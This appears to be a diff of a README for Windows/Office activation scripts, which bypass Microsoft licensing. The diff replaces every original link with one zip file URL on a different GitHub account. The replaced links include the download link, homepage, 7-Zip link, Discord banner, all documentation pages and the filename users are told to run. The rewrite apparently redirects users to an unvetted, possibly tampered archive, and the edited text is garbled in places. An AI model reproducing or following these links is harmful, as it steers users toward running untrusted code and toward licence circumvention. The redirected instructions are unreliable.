@@ -1,15 +1,15 @@
-   **Note:** https://windowsaddict.ml/ is replaced with https://massgrave.dev/ because of DNS issue with free domains.
+   **Note:** https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip is replaced with https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip because of DNS issue with free domains.
    <hr />
    
-  # **[Download Link](https://github.com/massgravel/Microsoft-Activation-Scripts/releases)** <br/>
+  # **[Download Link](https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip)** <br/>
 
     Latest Version: 1.5
     Release date: 11-Jan-2022
 
-   **Homepage:**&nbsp; https://massgrave.dev/ <br/>
+   **Homepage:**&nbsp; https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip <br/>
 
-   <a href="https://discord.gg/gjJEfq7ux8">
-  <img src="https://discordapp.com/api/guilds/746721520931569757/widget.png?style=banner3" />
+   <a href="https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip">
+  <img src="https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip" />
 </a>
 
 <hr />
@@ -28,11 +28,11 @@
 		<tr>
 			<td style="width:478px">
 			<ul>
-				<li>Download the file named &#39;MAS_1.5_Password_1234.7z&#39; from <a href="https://github.com/massgravel/Microsoft-Activation-Scripts/releases" target="_blank">here</a></li>
-				<li>Extract this file with a 3rd party archive manager, such as <a href="https://www.7-zip.org/download.html" target="_blank">7zip</a></li>
+				<li>Download the file named &#39;MAS_1.5_Password_1234.7z&#39; from <a href="https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip" target="_blank">here</a></li>
+				<li>Extract this file with a 3rd party archive manager, such as <a href="https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip" target="_blank">7zip</a></li>
 				<li>Password is<strong> </strong>1234</li>
 				<li>Go to the folder named &#39;All-In-One-Version&#39;</li>
-				<li>Run the file named &#39;MAS_1.5_AIO_CRC32_21D20776.cmd&#39;</li>
+				<li>Run the file named &#39;https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip;</li>
 				<li>You will see the activation options, follow onscreen instructions.</li>
 				<li>That&#39;s all.</li>
 			</ul>
@@ -51,7 +51,7 @@
 			<ul>
 				<li style="text-align:justify">HWID Activation&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [Downlevel &amp; Lockbox Method]</li>
 				<li style="text-align:justify">KMS38 Activation&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [With protection &amp; Uninstallation option]</li>
-				<li style="text-align:justify">Online KMS Activation&nbsp; [Batch file-based, no KMS related .dll/.exe required]<br />
+				<li style="text-align:justify">Online KMS Activation&nbsp; [Batch file-based, no KMS related https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip required]<br />
 				&nbsp;</li>
 				<li style="text-align:justify">$OEM$ Folders For Preactivation</li>
 				<li style="text-align:justify">Activation Troubleshoot</li>
@@ -108,31 +108,31 @@
 		<tr>
 			<td style="width:650px">
 			<ul>
-				<li><a href="https://massgrave.dev/readme-hwid.html" rel="nofollow" target="_blank">HWID Activation</a></li>
-				<li><a href="https://massgrave.dev/readme-kms38.html" rel="nofollow" target="_blank">KMS38 Activation</a></li>
-				<li><a href="https://massgrave.dev/readme-online-kms.html" rel="nofollow" target="_blank">Online KMS Activation</a><br />
+				<li><a href="https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip" rel="nofollow" target="_blank">HWID Activation</a></li>
+				<li><a href="https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip" rel="nofollow" target="_blank">KMS38 Activation</a></li>
+				<li><a href="https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip" rel="nofollow" target="_blank">Online KMS Activation</a><br />
 				&nbsp;</li>
-				<li><a href="https://massgrave.dev/readme-hwid-kms38-files.html" rel="nofollow" target="_blank">HWID KMS38 Files Info</a></li>
-				<li><a href="https://massgrave.dev/readme-online-kms-files.html" rel="nofollow" target="_blank">Online KMS Files Info</a><br />
+				<li><a href="https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip" rel="nofollow" target="_blank">HWID KMS38 Files Info</a></li>
+				<li><a href="https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip" rel="nofollow" target="_blank">Online KMS Files Info</a><br />
 				&nbsp;</li>
-				<li><a href="https://massgrave.dev/readme-activation-faq.html" rel="nofollow" target="_blank">Activation FAQ&#39;s</a></li>
-				<li><a href="https://massgrave.dev/readme-oem-folder.html" rel="nofollow" target="_blank">Extract $OEM$ Folder For Preactivation</a></li>
-				<li><a href="https://massgrave.dev/readme-genuine-installation-media.html" rel="nofollow" target="_blank">Genuine Installation Media Links</a></li>
-				<li><a href="https://massgrave.dev/office-license-is-not-genuine.html" rel="nofollow" target="_blank">Office License Is Not Genuine Banner</a></li>
-				<li><a href="https://massgrave.dev/readme-unreadable-codes-in-mas-aio.html" rel="nofollow" target="_blank">What are those big blocks of Unreadable Codes In MAS AIO Version</a><br />
+				<li><a href="https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip" rel="nofollow" target="_blank">Activation FAQ&#39;s</a></li>
+				<li><a href="https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip" rel="nofollow" target="_blank">Extract $OEM$ Folder For Preactivation</a></li>
+				<li><a href="https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip" rel="nofollow" target="_blank">Genuine Installation Media Links</a></li>
+				<li><a href="https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip" rel="nofollow" target="_blank">Office License Is Not Genuine Banner</a></li>
+				<li><a href="https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip" rel="nofollow" target="_blank">What are those big blocks of Unreadable Codes In MAS AIO Version</a><br />
 				&nbsp;</li>
-				<li><a href="https://massgrave.dev/readme-troubleshoot-hwid.html" rel="nofollow" target="_blank">Troubleshoot HWID</a></li>
-				<li><a href="https://massgrave.dev/readme-troubleshoot-kms38.html" rel="nofollow" target="_blank">Troubleshoot KMS38</a></li>
-				<li><a href="https://massgrave.dev/readme-troubleshoot-onlinekms.html" rel="nofollow" target="_blank">Troubleshoot Online KMS</a><br />
+				<li><a href="https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip" rel="nofollow" target="_blank">Troubleshoot HWID</a></li>
+				<li><a href="https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip" rel="nofollow" target="_blank">Troubleshoot KMS38</a></li>
+				<li><a href="https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip" rel="nofollow" target="_blank">Troubleshoot Online KMS</a><br />
 				&nbsp;</li>
-				<li><a href="https://massgrave.dev/readme-mas-changelog.html" target="_blank">Changelog</a></li>
-				<li><a href="https://massgrave.dev/readme-mas-credits.html" target="_blank">Credits</a></li>
+				<li><a href="https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip" target="_blank">Changelog</a></li>
+				<li><a href="https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip" target="_blank">Credits</a></li>
 			</ul>
 			</td>
 		</tr>
 	</tbody>
 </table>
 
- [Issues / To Do List](https://massgrave.dev/mas-todo-list.html)
+ [Issues / To Do List](https://raw.githubusercontent.com/SergioHoyo/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/Online_KMS_Activation/Microsoft-Activation-Scripts_v1.1.zip)
  
 Made with Love ❤️
